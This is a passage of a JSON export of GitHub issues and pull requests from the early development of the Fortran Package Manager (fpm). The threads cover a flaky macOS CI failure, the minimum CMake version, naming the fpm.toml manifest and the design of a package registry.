                    "date": "2021-02-19 16:43:56+00:00",
                    "text": "I think I might create a table to track which Netlib codes are already fpm-compatible. What do you think?\n\nWe already have a keywords and categories entry for the package manifest, netlib might qualify as category, if not then at least as keyword. The fpm registry could certainly help with indexing those projects."
                },
                {
                    "user": "certik",
                    "date": "2021-02-19 16:52:25+00:00",
                    "text": "I just created an issue #365 where we should discuss where to host such packages."
                }
            ]
        },
        {
            "number": 16,
            "user": "certik",
            "date": "2020-01-15 15:02:32+00:00",
            "title": "The fpm binary gets interrupted at the CI (macOS)",
            "text": "There is a bug at our CI that I haven't been able to figure out yet. Here is an example of it: https://github.com/fortran-lang/fpm/runs/390475601.\nHere is what I know:\n\n\nIt only happens on macOS, never on Linux or Windows\n\n\nRestarting the build typically fixes it (sometimes it fails 2x or 3x in a row, but eventually it always passes)\n\n\nThe cargo test runs in parallel by default, so I set -j1 to run in serial. That seemed to improve how often it fails (although I could be wrong on that). It still fails sometimes however, so the actual bug is still there.\n\n\nThe error is:\n\n\nthread 'test_2' panicked at 'Unexpected failure.\ncode=<interrupted>\nstderr=``````\ncommand=`\"/Users/runner/runners/2.163.1/work/fpm/fpm/target/x86_64-apple-darwin/debug/fpm\" \"build\"`\ncode=<interrupted>\nstdout=``````\nstderr=``````\n', /Users/runner/.cargo/registry/src/github.com-1ecc6299db9ec823/assert_cmd-0.10.2/src/assert.rs:148:17\n\nWhich is caused by the assert_cmd package, which just uses the Rust's std::process::Command, when the output command did not succeed, but it also failed to retrieve the error code, which according to the documentation means the process was interrupted by the system (with some signal like SIGKILL).",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-01-15 15:31:20+00:00",
                    "text": "And here it failed in master (https://github.com/fortran-lang/fpm/runs/391281163) after merging #15 that passed. So we have to figure this out."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-01-15 15:35:41+00:00",
                    "text": "Is there anybody with a Mac that can reproduce this locally?"
                },
                {
                    "user": "certik",
                    "date": "2020-01-15 15:39:25+00:00",
                    "text": "I tried it on a macOS yesterday locally, and I can't reproduce it. So we have to Debug it at the CI itself (as I have done in #14), which is quite time consuming."
                },
                {
                    "user": "certik",
                    "date": "2020-01-16 06:48:29+00:00",
                    "text": "As reported in #18 (comment), the process gets interrupted with signal 9 (SIGKILL). I suspected that above, but it's nice to have a proof. For some reason macOS kills the fpm process."
                },
                {
                    "user": "certik",
                    "date": "2020-01-16 07:03:41+00:00",
                    "text": "This might be a bug at GitHub, so I reported it at https://github.community/t5/GitHub-Actions/GitHub-Actions-on-macOS-randomly-kill-my-test-program/m-p/43526#M5414."
                },
                {
                    "user": "certik",
                    "date": "2020-01-16 18:28:12+00:00",
                    "text": "I am trying to reliably reproduce this bug in certik#1."
                },
                {
                    "user": "certik",
                    "date": "2020-01-17 21:44:30+00:00",
                    "text": "One approach to fix this is to do cargo test || cargo test. An example where the first one fails, but the second one succeeds is https://github.com/certik/fpm/runs/396031403."
                },
                {
                    "user": "certik",
                    "date": "2020-01-17 21:56:03+00:00",
                    "text": "This is precisely the kind of issue I am a bit worried with Rust, that the toolchain is not mature enough and will produce binaries that do not work (but only sometimes!). The closest error that I was able to find is:\ngolang/go#19734"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-01-17 22:05:49+00:00",
                    "text": "But this likely has more to do with GitHub Actions than Rust itself. Neither you nor the person from the GitHub Forum could reproduce it locally, correct?\nI agree it's very important to have fpm work on all 3 major platforms, but I wonder if it's a bit too early to focus Mac OS work 100% of the time? Why not let it fail sometimes? We can manually trigger the build when it does fail."
                },
                {
                    "user": "certik",
                    "date": "2020-01-18 00:20:48+00:00",
                    "text": "I implemented a workaround in #20. The problem with GitHub Actions is that you cannot just restart a single build, you have to restart all the builds. The other issue is that it was already failing a lot with just 3 tests. Once we have hundreds of tests, it might end up failing all the time. For now the workaround implemented in #20 should make the CI robust enough for now. But we'll have to get back to this and fix it.\nThe reason I spent so much time on this is that I thought I can use \"bisection\" to create a minimal example that fails, and figure it out. But I failed. Essentially it's extremely unreliable to trigger the bug by submitting 20 commits. Sometimes they all pass, and sometimes they get 4 failures. And I haven't figured out a minimal example that can reliably trigger it in 20 runs. As I start removing things, the failures become less and less frequent.\nIf #20 doesn't give us reliable CI, then we can switch the macOS build to Azure pipelines or Travis-CI.\nBut having a reliable CI is a must."
                },
                {
                    "user": "certik",
                    "date": "2020-01-21 18:31:06+00:00",
                    "text": "I reported it in the Rust community also: https://users.rust-lang.org/t/github-actions-randomly-kill-a-test-program/37255"
                },
                {
                    "user": "certik",
                    "date": "2020-01-28 05:35:21+00:00",
                    "text": "I think #29 fixed this issue."
                }
            ]
        },
        {
            "number": 15,
            "user": "certik",
            "date": "2020-01-15 05:42:54+00:00",
            "title": "Remove manual tests",
            "text": "Use \"cargo test\" instead.",
            "comments": []
        },
        {
            "number": 14,
            "user": "certik",
            "date": "2020-01-14 23:15:22+00:00",
            "title": "WIP: try to reproduce the error",
            "text": "",
            "comments": []
        },
        {
            "number": 13,
            "user": "certik",
            "date": "2020-01-14 21:20:21+00:00",
            "title": "Add Rust tests",
            "text": "",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-01-14 21:39:55+00:00",
                    "text": "The Linux CI is currently broken at GitHub, but once they fix it, it should pass. The main problem that the macOS build was failing seems to be fixed by a571570. I am going to wait until the CI works again and rerun tests. Once they all pass, we can merge."
                },
                {
                    "user": "certik",
                    "date": "2020-01-14 23:08:53+00:00",
                    "text": "I tested almost 10x and the macOS built never failed, so I thought it was fixed. But now it failed twice in a row:\nrunning 3 tests\ntest test_help ... ok\ntest test_2 ... FAILED\ntest test_1 ... ok\n\nfailures:\n\n---- test_2 stdout ----\nthread 'test_2' panicked at 'Unexpected failure.\ncode=<interrupted>\nstderr=``````\ncommand=`\"/Users/runner/runners/2.163.1/work/fpm/fpm/target/x86_64-apple-darwin/debug/fpm\" \"build\"`\ncode=<interrupted>\nstdout=``````\nstderr=``````\n', /Users/runner/.cargo/registry/src/github.com-1ecc6299db9ec823/assert_cmd-0.10.2/src/assert.rs:148:17\n...\n\nThe CI is killing the runner for some reason, but I don't know why."
                },
                {
                    "user": "certik",
                    "date": "2020-01-15 04:30:59+00:00",
                    "text": "The macOS bug is still there, but by restarting the tests it typically fixes itself, so I am going to merge this and we'll eventually figure out what is causing it."
                }
            ]
        },
        {
            "number": 12,
            "user": "certik",
            "date": "2020-01-14 20:47:50+00:00",
            "title": "Draft: See if we get a failure",
            "text": "",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-01-14 21:40:14+00:00",
                    "text": "Closing in favor of #13."
                }
            ]
        },
        {
            "number": 11,
            "user": "certik",
            "date": "2020-01-14 20:42:36+00:00",
            "title": "Add Rust tests",
            "text": "",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-01-14 21:40:34+00:00",
                    "text": "Closing in favor of #13."
                }
            ]
        },
        {
            "number": 10,
            "user": "certik",
            "date": "2020-01-14 20:35:44+00:00",
            "title": "Prepare fpm to run on Windows using Rust tests",
            "text": "",
            "comments": []
        },
        {
            "number": 9,
            "user": "certik",
            "date": "2020-01-14 17:06:48+00:00",
            "title": "Run all tests using \"cargo test\" only",
            "text": "",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-01-14 17:40:14+00:00",
                    "text": "Unfortunately there seem to be random errors on macOS of the type:\n---- test_help stdout ----\nthread 'test_help' panicked at 'Unexpected failure.\ncode=<interrupted>\nstderr=``````\ncommand=`\"/Users/runner/runners/2.163.1/work/fpm/fpm/target/x86_64-apple-darwin/debug/fpm\" \"--help\"`\ncode=<interrupted>\nstdout=``````\nstderr=``````\n', /Users/runner/.cargo/registry/src/github.com-1ecc6299db9ec823/assert_cmd-0.10.2/src/assert.rs:148:17\nstack backtrace:\n   0: backtrace::backtrace::libunwind::trace\n             at /Users/runner/.cargo/registry/src/github.com-1ecc6299db9ec823/backtrace-0.3.40/src/backtrace/libunwind.rs:88\n   1: backtrace::backtrace::trace_unsynchronized\n             at /Users/runner/.cargo/registry/src/github.com-1ecc6299db9ec823/backtrace-0.3.40/src/backtrace/mod.rs:66\n   2: std::sys_common::backtrace::_print_fmt\n             at src/libstd/sys_common/backtrace.rs:77\n   3: <std::sys_common::backtrace::_print::DisplayBacktrace as core::fmt::Display>::fmt\n             at src/libstd/sys_common/backtrace.rs:61\n   4: core::fmt::write\n             at src/libcore/fmt/mod.rs:1028\n   5: std::io::Write::write_fmt\n             at /rustc/73528e339aae0f17a15ffa49a8ac608f50c6cf14/src/libstd/io/mod.rs:1412\n   6: std::io::impls::<impl std::io::Write for alloc::boxed::Box<W>>::write_fmt\n             at src/libstd/io/impls.rs:141\n   7: std::sys_common::backtrace::_print\n             at src/libstd/sys_common/backtrace.rs:65\n   8: std::sys_common::backtrace::print\n             at src/libstd/sys_common/backtrace.rs:50\n   9: std::panicking::default_hook::{{closure}}\n             at src/libstd/panicking.rs:188\n  10: std::panicking::default_hook\n             at src/libstd/panicking.rs:202\n  11: std::panicking::rust_panic_with_hook\n             at src/libstd/panicking.rs:464\n  12: std::panicking::continue_panic_fmt\n             at src/libstd/panicking.rs:373\n  13: std::thread::local::fast::Key<T>::try_initialize\n  14: assert_cmd::assert::Assert::success::{{closure}}\n             at /Users/runner/.cargo/registry/src/github.com-1ecc6299db9ec823/assert_cmd-0.10.2/src/assert.rs:148\n  15: core::option::Option<T>::unwrap_or_else\n             at /rustc/73528e339aae0f17a15ffa49a8ac608f50c6cf14/src/libcore/option.rs:419\n  16: assert_cmd::assert::Assert::success\n             at /Users/runner/.cargo/registry/src/github.com-1ecc6299db9ec823/assert_cmd-0.10.2/src/assert.rs:147\n  17: cli::test_help\n             at tests/cli.rs:9\n  18: cli::test_help::{{closure}}\n             at tests/cli.rs:6\n\nThis error only happens sometimes. So there might be some bug in the assert_cmd package on macOS."
                },
                {
                    "user": "certik",
                    "date": "2020-01-14 21:41:03+00:00",
                    "text": "Closing in favor of #13."
                }
            ]
        },
        {
            "number": 8,
            "user": "scivision",
            "date": "2020-01-14 16:43:19+00:00",
            "title": "cmake_minimum_required => 3.14",
            "text": "fpm/src/main.rs\n    \n    \n         Line 38\n      in\n      bf8ee01\n    \n    \n    \n    \n\n        \n          \n           cmake_minimum_required(VERSION 3.5.0 FATAL_ERROR) \n        \n    \n  \n\n\nThe CMake syntax used in this Rust script requires at least CMake 3.13.\nIn general in the Fortran stdlib we currently planned to use CMake 3.14 minimum.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-01-14 21:15:15+00:00",
                    "text": "Yes, it needs to be 3.14. Is the FATAL_ERROR needed? It seems to fail fatally even without it."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-01-15 03:34:02+00:00",
                    "text": "This raises a broader issue about how should we handle minimum CMake version in fpm.\nShould we set a fixed minimum cmake version for all packages brought in by fpm (even if they are okay with an earlier version)? This seems like an unnecessary overkill to me.\nOr, should we let cmake do the work and have individual package builds fail if user's cmake is inadequate? I like this better.\nAre there other approaches?"
                },
                {
                    "user": "scivision",
                    "date": "2020-01-15 07:21:52+00:00",
                    "text": "if you intend to communicate with CMake beyond simple command line interaction, there was a significant improvement in CMake 3.14 adding a file based API. That would avoid having to implement that twice for CMake < 3.14 and the deprecated CMake server, if such communication is necessary for fpm.\nThis would allow for example to introspect CMake projects that don't use fpm, but are used by fpm."
                },
                {
                    "user": "scivision",
                    "date": "2020-01-15 16:35:19+00:00",
                    "text": "In my opinion the FATAL_ERROR parameter to cmake_minimum_version() can be omitted. It does nothing for CMake releases less than about 15 years old, and those with CMake that old would have trouble building almost anything for the past few years."
                },
                {
                    "user": "certik",
                    "date": "2020-01-15 19:21:08+00:00",
                    "text": "@scivision thanks. (I can't believe I've been using CMake longer than 15 years, but it seems I have...)\nRegarding the minimal version, it requires 3.14 for Windows, and I was thinking of simply using that for now everywhere.\nOnce fpm is further along, let's revisit this. Down the road I actually think fpm should be able to build things on its own, just like Cargo does it, which would be a lot faster (since cmake's configure phase can be pretty slow).\nFor now I just want to get some minimal product working, then we'll carefully revisit all these decisions."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-12-09 21:42:53+00:00",
                    "text": "This seems to be related to the removed Rust version.\nThe minimal required CMake version will become relevant again, once we implement a CMake generator. Once this becomes relevant we can either reopen this issue or create a new one."
                }
            ]
        },
        {
            "number": 7,
            "user": "certik",
            "date": "2020-01-14 15:46:23+00:00",
            "title": "CI: Test on Windows",
            "text": "",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-01-14 16:10:13+00:00",
                    "text": "Tests pass, so I'll merge this. Futher work needs to be done on Windows, but this is a start."
                }
            ]
        },
        {
            "number": 6,
            "user": "certik",
            "date": "2020-01-14 06:08:41+00:00",
            "title": "How to support packages that do not conform to our \"standard layout\" (to be specified...)",
            "text": "How to support packages that do not conform to our \"standard layout\" (to be specified...). Some examples of such a package would be reference Lapack, or Arpack. The way to do that is that we create a new repository, say certik/lapack.fpm, which will have fpm.toml, in there it would specify the url to the actual sources (https://github.com/Reference-LAPACK/lapack) and a build script, which would build the sources (using CMake in this case) and install them into some $PREFIX provided by fpm and fpm takes it from there. This approach also works for non Fortran packages --- the build script either builds it, or requires it from the system (where it can be provided by, e.g., Spack). Either way this is a clean way to hook this up into the fpm ecosystem.",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-01-15 03:40:11+00:00",
                    "text": "Yes, I think fpm.toml for each project should include the exact commands that need to be executed to build the package, very much like we do in yml files for CI.\nThat said, until a need arises, I'd suggest that we take this approach for all packages, including those built with CMake, autotools, or plain Makefiles.\nIf we can make a package build in CI, we should be able to build it by fpm by making it execute commands specified in fpm.toml.\n\nThe way to do that is that we create a new repository, say certik/lapack.fpm\n\nDoes this even need to be a separate repo? Are you thinking about a repo that would be the registry of all fpm-supported packages, like what I described in #4 ?"
                }
            ]
        },
        {
            "number": 5,
            "user": "certik",
            "date": "2020-01-14 06:08:04+00:00",
            "title": "Naming of `fpm.toml`",
            "text": "Naming of fpm.toml. Cargo names Cargo.toml with capital C, and as explained in https://doc.rust-lang.org/cargo/faq.html#why-cargotoml, to \"ensure that the manifest was grouped with other similar configuration files in directory listings. Sorting files often puts capital letters before lowercase letters, ensuring files like Makefile and Cargo.toml are placed together.\" If we want to do the same, the candidates are Fpm.toml and FPM.toml. I think fpm.toml looks better. But using a capital letter would make it similar to CMakeLists.txt also. We might want to devise a different name or naming scheme. Any ideas?",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-01-15 03:30:36+00:00",
                    "text": "If we consider fpm.toml, I like it better than either Fpm.toml or FPM.toml. I see little value in the sorting argument.\nIf I think of any better names than fpm.toml, I will write here, but I think fpm.toml is just fine."
                },
                {
                    "user": "ivan-pi",
                    "date": "2020-01-15 08:25:24+00:00",
                    "text": "If I get it correctly in the Rust world libraries/packages are called crates, and the package manager called Cargo is responsible for shipping these crates?\nIn line with the Rust naming, if you don't mind playing with some old Fortran terminology, crates would become decks (as in punched card decks), and the Fortran package manager would be a box/package/drawer/folder/cabinet/chest/case/dealer/dispenser/pile/loader/...?.... Unfortunately none of these words really ring. The  fpm.toml acronym is also easy enough to remember.\nFrom Wikipedia:\n\n...a box of computer programs in punched card form from the early 1970s. The deck in the middle shows what a program deck looked like after extensive editing and debugging. The cardboard box was originally used to ship blank cards and held 2000 cards."
                },
                {
                    "user": "certik",
                    "date": "2020-01-16 05:22:26+00:00",
                    "text": "Thanks @ivan-pi for the ideas.\nI think a Rust package is simply called a crate, but even I am not 100% sure. For that reason I would recommend to simply call a package as a package, so that people know what that means.\nI agree, let's just use fpm.toml."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-30 03:28:15+00:00",
                    "text": "Should we close this now? We've implemented it as fpm.toml."
                },
                {
                    "user": "certik",
                    "date": "2020-04-30 05:25:31+00:00",
                    "text": "Yes, can be closed.\n\u2026\nOn Wed, Apr 29, 2020, at 9:28 PM, Brad Richardson wrote:\n\n\n Should we close this now? We've implemented it as `fpm.toml`.\n\n \u2014\n You are receiving this because you authored the thread.\n Reply to this email directly, view it on GitHub\n <#5 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWEQACM33QVEE66CTT3RPDV5XANCNFSM4KGNRUOQ>."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-30 14:05:50+00:00",
                    "text": "Ok, closing."
                }
            ]
        },
        {
            "number": 4,
            "user": "certik",
            "date": "2020-01-14 06:07:30+00:00",
            "title": "Hosting of packages",
            "text": "Eventually we need to have a central place for packages similar to crates.io.\nBut for now we will use a git repository (GitHub, GitLab and other places will work) as well as just url for a tarball. That way we don't need to host anything ourselves at first and can get the initial community and ecosystem of packages built up without worrying about security and other issues that will come with maintaining our own repository.",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-01-15 03:26:22+00:00",
                    "text": "Although worthwhile thinking ahead, I think we are far from this. It's a big technical challenge that requires dedicated hardware and person (people) if it's to work smoothly.\nIn the interim, as you describe, we can maintain a registry that provides all the info about available packages that fpm needs, but the source code of packages is hosted wherever its hosted by the package maintainers (GitHub, GitLab, custom url, whatever). The downside to this approach is that if the maintainer takes down the package, or changes the url, or GitHub is down, the package is unavailable through fpm. I think these are edge cases that we can live with and work around for a while, especially considering that Fortran's ecosystem is still fledgling.\nLet's discuss what would the registry look like. How about if we maintain a registry of fpm.toml files for each supported package in fpm's repo. Something like this:\nfpm/\n  Registry/\n    blas/\n      fpm.toml\n    lapack/\n      fpm.toml\n    stdlib/\n      fpm.toml\n    ...\n\nfpm.toml for a package includes all the info that fpm would need to build the package, including but not limited to:\n\nBuild backend such as CMake, autotools, or plan make\nGitHub, GitLab or custom url from which to download source code\nVersions available\nDependencies\nWhat else?\n\nFor a maintainer to add their package to fpm, they would open a PR in fpm to add their fpm.toml to the fpm Registry.\nAm I going in the right direction?"
                },
                {
                    "user": "certik",
                    "date": "2020-01-15 05:13:52+00:00",
                    "text": "Actually, the registry would be just a list of urls to download the package, so:\nhttps://github.com/certik/lapack.fpm\nhttps://github.com/fortran-lang/stdlib\n...\n\nEach of these urls will be either a tarball, or a git repository. When you download it, it contains the fpm.toml file with all the metadata. And we'll have code that will simply download each package and extract the metadata to create a nice (static) webpage and to allow to search from a command line (fpm search) --- we can automatically prepare some JSON file with package name / description / url, etc., and host it at some github repo, and fpm would simply download it. (The registry might be a combination of version + url, because a single package can have multiple verisons, so one would use, e.g., git tags for different versions.)\nRegarding the design of fpm, I would do exactly what Rust does. So a standard layout (which however can be disabled if you don't like it from Cargo.toml), pure Rust is automatic, non-Rust parts are compiled by hand by writing a build script (and listing it in Cargo.toml, then Cargo executes it before building Rust parts). From the build script you can call cmake or whatever build system one wants."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-01-15 14:38:34+00:00",
                    "text": "Can you explain why you need a separate (middle-man) repo for metadata, per package?\nIf fpm gets metadata from one repo, which would then instruct it to download the package tarball from a custom url and build it with some commands, then it would have to do that transaction every time you inquire about a package. To not query a remote repo on every command, you'd want to cache results, which basically means you'd be building a local registry of packages. But if you're building a local registry of packages, you might as well maintain the registry in one repo.\nMore problematically, without a local (or remote but aggregated) registry, how do you search for available packages? With Cargo I can do:\n$ cargo search blas\nblas = \"0.20.0\"                   # The package provides wrappers for BLAS (Fortran).\ncoaster-blas = \"0.2.0\"            # Coaster library for full BLAS support\nrust-blas = \"0.1.1\"               # BLAS bindings and wrappers, fork of rblas\ncollenchyma-blas = \"0.2.0\"        # Collenchyma library for full BLAS support\nblas-src = \"0.4.0\"                # The package provides a BLAS source of choice.\nrblas = \"0.0.13\"                  # BLAS bindings and wrappers\nblas-sys = \"0.7.1\"                # The package provides bindings to BLAS (Fortran).\ncuda_blas = \"0.1.0\"               # cuBLAS API bindings.\npopcorn-blas = \"0.1.0\"            # Popcorn BLAS: Broadcasting BLAS operations for Popcorn\nnetlib-blas-provider = \"0.0.8\"    # BLAS/LAPACK provider using the Netlib implementation\n... and 54 crates more (use --limit N to see more)\n\nWould fpm search only list urls? Or would it try to fetch metadata from any number of repos that match the pattern? This won't scale.\nLooking at my local .cargo/ directory, it doesn't seem like Cargo keeps an index of all packages locally (for many many packages this doesn't scale either) but fetches from a remote registry (I assume cargo.io)."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-01-15 14:42:22+00:00",
                    "text": "Regarding the design of fpm, I would do exactly what Rust does. So a standard layout (which however can be disabled if you don't like it from Cargo.toml), pure Rust is automatic, non-Rust parts are compiled by hand by writing a build script (and listing it in Cargo.toml, then Cargo executes it before building Rust parts). From the build script you can call cmake or whatever build system one wants.\n\nAre you saying that for pure Fortran code (like stdlib at the moment), you wouldn't use a build system but do the build explicitly by directly invoking the compiler? In the long run I think this is a good choice but I'm worried that it'd be a big ordeal to implement because now you have to worry about building dependency trees and all the necessary stuff that CMake was doing for us.\nOr, are you thinking about generating a CMakeLists.txt based on the scan of the source files and directories? Seems complex too."
                },
                {
                    "user": "certik",
                    "date": "2020-01-15 15:37:45+00:00",
                    "text": "Or, are you thinking about generating a CMakeLists.txt based on the scan of the source files and directories? Seems complex too.\n\nYes, that's how it is already implemented in this very small prototype of fpm. If you look here:\nhttps://github.com/fortran-lang/fpm/tree/master/tests/1\nAll you have to do is execute fpm build in that directory, and it will generate the proper CMakeLists.txt and build it and then fpm run will run the executable.\nThat's exactly how Cargo does it, and I think that's what we want also.\nAnd yes, I agree with you that using CMake as the vehicle to actually build it is the way to go initially. All fpm has to do is to construct it properly.\nIt already works, and my next step is to start doing the dependencies. Once we have a prototype of that, let's brainstorm how to host it properly. (Yes, I want fpm search to list names and descriptions just like Cargo does, so it needs to download some JSON description of all packages --- But what I am arguing is to maintain such JSON description automatically, not by hand, by downloading it from the actual packages --- we can discuss it later.)"
                }
            ]
        },
        {
            "number": 3,
            "user": "certik",
            "date": "2020-01-14 06:02:10+00:00",
            "title": "Remove GitLab-CI",
            "text": "We will use GitHub and its CI from now on.",
            "comments": []
        },
        {
            "number": 2,
            "user": "certik",
            "date": "2020-01-14 05:43:25+00:00",
            "title": "Build and run Rust tests",
            "text": "",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-01-14 06:00:39+00:00",
                    "text": "Tests pass, merging."
                }
            ]
        },
        {
            "number": 1,
            "user": "certik",
            "date": "2020-01-14 05:38:24+00:00",
            "title": "Add GitHub CI",
            "text": "",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-01-14 05:40:20+00:00",
                    "text": "I think it has to be merged first in order to run."
                }
            ]
        }
    ]
}